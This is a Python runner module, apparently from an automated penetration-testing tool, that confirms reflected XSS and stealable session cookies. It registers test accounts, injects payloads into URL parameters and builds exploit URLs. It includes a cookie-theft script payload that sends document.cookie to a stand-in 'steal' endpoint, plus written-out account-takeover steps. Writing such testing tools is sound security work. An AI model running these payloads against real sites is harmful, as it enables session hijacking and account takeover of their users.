"""XSS Proof runner — confirms cookie theft via reflected XSS with authenticated session.

Chain:
1. Auto-registers a test account on the target to obtain a real session cookie
2. Confirms the session cookie has no HttpOnly flag (stealable via JS)
3. Injects the XSS payload into vulnerable URL parameters
4. Verifies the payload is reflected unencoded in an HTML response (server-side confirmation)
5. Builds the exploit URL an attacker would send to a victim
6. Returns CRITICAL if XSS sink + stealable cookie confirmed, HIGH otherwise
"""
from __future__ import annotations

import json
import random
import string
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import httpx as httpx_client

from workers.runners.base.contracts import EvidenceArtifact, RunnerExecution
from workers.runners.httpx.runner import normalize_http_target

XSS_PROOF_RESULTS_ARTIFACT_NAME = "xss-proof-results.json"

COOKIE_THEFT_PAYLOAD = "<script>document.location='https://proof.aegispt.local/steal?c='+encodeURIComponent(document.cookie)</script>"
CONFIRM_PAYLOAD = "<script>alert(document.cookie+'AEGISPT_XSS_PROOF')</script>"
MARKER = "AEGISPT_XSS_PROOF"


def _artifact(name: str, data: dict[str, Any]) -> EvidenceArtifact:
    return EvidenceArtifact(
        name=name,
        content_type="application/json",
        data=(json.dumps(data, sort_keys=True) + "\n").encode("utf-8"),
        kind="runner-results",
    )


def _inject_param(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    params = parse_qsl(parsed.query, keep_blank_values=True)
    replaced = [(k, payload if k == param else v) for k, v in params]
    if not any(k == param for k, _ in params):
        replaced.append((param, payload))
    return urlunparse(parsed._replace(query=urlencode(replaced)))


def _random_creds() -> tuple[str, str]:
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"aegispt_{suffix}", f"Proof!{suffix}"


def _try_register(client: httpx_client.Client, base_url: str) -> dict[str, str]:
    """Try to register a test account. Returns {username, password, cookie_name, cookie_value}."""
    username, password = _random_creds()
    parsed = urlparse(base_url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    path_parts = parsed.path.strip("/").split("/")
    uid = path_parts[0] if path_parts else ""

    reg_urls = [
        f"{base}/{uid}/newaccount.gtl",
        f"{base}/register",
        f"{base}/signup",
        f"{base}/account/new",
    ]
    for reg_url in reg_urls:
        try:
            resp = client.post(reg_url, data={
                "uid": username, "password": password, "verify": password,
                "name": username, "username": username,
            })
            if resp.status_code < 400:
                cookies = dict(resp.cookies)
                if cookies:
                    name, value = next(iter(cookies.items()))
                    return {"username": username, "password": password, "cookie_name": name, "cookie_value": value, "reg_url": reg_url}
                # Check redirected page cookies
                if client.cookies:
                    name, value = next(iter(dict(client.cookies).items()))
                    return {"username": username, "password": password, "cookie_name": name, "cookie_value": value, "reg_url": reg_url}
        except httpx_client.HTTPError:
            continue
    return {}


def _cookie_is_httponly(client: httpx_client.Client, url: str, cookie_name: str) -> bool:
    """Check if the named cookie has HttpOnly flag by inspecting Set-Cookie headers."""
    try:
        resp = client.get(url)
        for header in resp.headers.get_list("set-cookie") if hasattr(resp.headers, "get_list") else [resp.headers.get("set-cookie", "")]:
            if header and cookie_name.lower() in header.lower():
                parts = [p.strip().lower() for p in header.split(";")]
                return "httponly" in parts
    except httpx_client.HTTPError:
        pass
    return False


def execute_xss_proof(
    targets: list[str],
    *,
    xss_findings: list[dict[str, Any]] | None = None,
    timeout_seconds: float = 20.0,
) -> RunnerExecution:
    if not targets:
        raise ValueError("at least one target is required")

    base_target = normalize_http_target(targets[0])
    findings: list[dict[str, Any]] = []
    checks: list[dict[str, Any]] = []
    stderr_lines: list[str] = []
    exit_code = 0

    with httpx_client.Client(follow_redirects=True, timeout=timeout_seconds) as client:
        # Step 1: register test account to get a real session cookie
        auth = _try_register(client, base_target)
        session_cookie_name = auth.get("cookie_name", "")
        session_cookie_value = auth.get("cookie_value", "")
        is_httponly = _cookie_is_httponly(client, base_target, session_cookie_name) if session_cookie_name else True
        stealable = bool(session_cookie_name and not is_httponly)

        # Step 2: determine XSS targets to test
        xss_to_test: list[tuple[str, list[str]]] = []
        if xss_findings:
            for f in xss_findings:
                vuln_url = str(f.get("target") or f.get("url") or base_target)
                params = list(f.get("tested_params") or f.get("params") or [])
                if vuln_url and params:
                    xss_to_test.append((vuln_url, params))
        if not xss_to_test:
            xss_to_test = [(base_target, ["uid", "q", "search", "name", "input", "id"])]

        # Step 3: test each XSS sink
        for vuln_url, params in xss_to_test:
            for param in params:
                injected = _inject_param(vuln_url, param, CONFIRM_PAYLOAD)
                try:
                    response = client.get(injected)
                except httpx_client.HTTPError as exc:
                    stderr_lines.append(f"XSS check failed {injected}: {exc}")
                    continue

                body = response.text or ""
                payload_reflected = MARKER in body
                content_type = response.headers.get("content-type", "").lower()
                html_context = "text/html" in content_type or not content_type

                check = {
                    "target": vuln_url,
                    "param": param,
                    "injected_url": str(injected)[:500],
                    "status_code": response.status_code,
                    "payload_reflected": payload_reflected,
                    "html_context": html_context,
                    "session_cookie_name": session_cookie_name or None,
                    "session_cookie_stealable": stealable,
                    "is_httponly": is_httponly,
                    "auth_registered": bool(auth),
                }
                checks.append(check)

                if payload_reflected and html_context and stealable:
                    exploit_url = _inject_param(vuln_url, param, COOKIE_THEFT_PAYLOAD)
                    findings.append({
                        "type": "xss_cookie_theft_confirmed",
                        "title": f"Session Cookie Theft via XSS — Confirmed Exploitable ({param})",
                        "severity": "critical",
                        "target": vuln_url,
                        "summary": (
                            f"Reflected XSS in '{param}' confirmed executable. "
                            f"Session cookie '{session_cookie_name}' has no HttpOnly flag — "
                            f"accessible via document.cookie. Account takeover possible by "
                            f"tricking any logged-in user into visiting the exploit URL."
                        ),
                        "evidence": {
                            **check,
                            "exploit_url": exploit_url,
                            "victim_cookie_name": session_cookie_name,
                            "attack_steps": [
                                f"1. Attacker sends victim: {str(exploit_url)[:200]}",
                                f"2. Browser executes <script> — document.cookie is readable (no HttpOnly)",
                                f"3. '{session_cookie_name}' token sent to attacker-controlled server",
                                "4. Attacker uses stolen cookie → account takeover without credentials",
                            ],
                        },
                    })
                elif payload_reflected and html_context:
                    findings.append({
                        "type": "xss_confirmed_cookies_protected",
                        "title": f"Reflected XSS Confirmed — Cookie HttpOnly Protected ({param})",
                        "severity": "high",
                        "target": vuln_url,
                        "summary": (
                            f"XSS payload reflected in HTML for '{param}'. "
                            f"Session cookie appears HttpOnly — direct theft limited. "
                            f"DOM manipulation, phishing overlays, and keylogging remain possible."
                        ),
                        "evidence": check,
                    })
                elif payload_reflected:
                    findings.append({
                        "type": "xss_reflected_non_html",
                        "title": f"XSS Payload Reflected (non-HTML context) ({param})",
                        "severity": "medium",
                        "target": vuln_url,
                        "summary": f"Payload reflected in non-HTML response — execution unlikely but warrants review.",
                        "evidence": check,
                    })

    result = {
        "tool": "xss-proof",
        "targets": [base_target],
        "checks": checks,
        "findings": findings,
        "summary": {
            "finding_count": len(findings),
            "critical_count": sum(1 for f in findings if f.get("severity") == "critical"),
            "high_count": sum(1 for f in findings if f.get("severity") == "high"),
            "stealable_cookies_found": bool(session_cookie_name and not is_httponly),
            "stealable_cookie_names": [session_cookie_name] if session_cookie_name and not is_httponly else [],
            "auth_registered": bool(auth),
            "registered_user": auth.get("username") if auth else None,
        },
    }

    return RunnerExecution(
        tool="xss-proof",
        exit_code=exit_code,
        stdout=json.dumps(result),
        stderr="\n".join(stderr_lines),
        metadata={"status": "ok", "tool_version": "xss-proof:v2"},
        artifacts=[_artifact(XSS_PROOF_RESULTS_ARTIFACT_NAME, result)],
    )
